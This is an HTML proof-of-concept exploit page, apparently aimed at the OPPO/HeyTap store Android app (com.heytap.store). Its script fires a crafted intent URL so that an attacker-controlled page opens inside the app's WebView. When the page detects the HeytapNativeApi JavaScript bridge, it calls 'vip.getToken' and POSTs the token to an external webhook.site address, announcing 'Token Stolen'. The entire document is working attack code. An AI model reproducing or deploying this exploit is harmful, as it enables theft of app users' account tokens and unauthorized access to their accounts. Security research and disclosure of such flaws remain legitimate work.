<body>

    <h2>OPPO Store Bypass (Double Hop)</h2>

    <div id="log">Status Log:<br></div>

    <script>
        const myExploitUrl = "https://pk009900.github.io/my-oppo-test/";
        const webhook = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
        const pkg = "com.heytap.store";

        function log(msg) {
            document.getElementById("log").innerHTML += "> " + msg + "<br>";
        }

        function doubleHop() {
            log("Attempting Double Hop Intent...");
            
            // Step 1: Attempt to open the intent in a new window to break the Play Store redirect chain
            const intent = `intent://www.oppo.com?url=${myExploitUrl}#Intent;scheme=https;package=${pkg};S.browser_fallback_url=${myExploitUrl};end`;
            
            var win = window.open(intent, '_blank');
            
            // Step 2: Fallback logic if the new window is blocked or fails
            setTimeout(function() {
                if(!win || win.closed || typeof win.closed=='undefined') {
                    log("Window blocked. Trying direct replace...");
                    window.location.replace(intent);
                }
            }, 500);
        }

        window.onload = function() {
            if (window.HeytapNativeApi) {
                log("<b style='color:green'>SUCCESS: JSAPI BRIDGE INJECTED!</b>");
                window.HeytapNativeApi.invoke("vip.getToken", (data) => {
                    fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
                    log("Token exfiltrated to Webhook.");
                    alert("PoC Successful: Token Stolen");
                });
            }
        };
    </script>
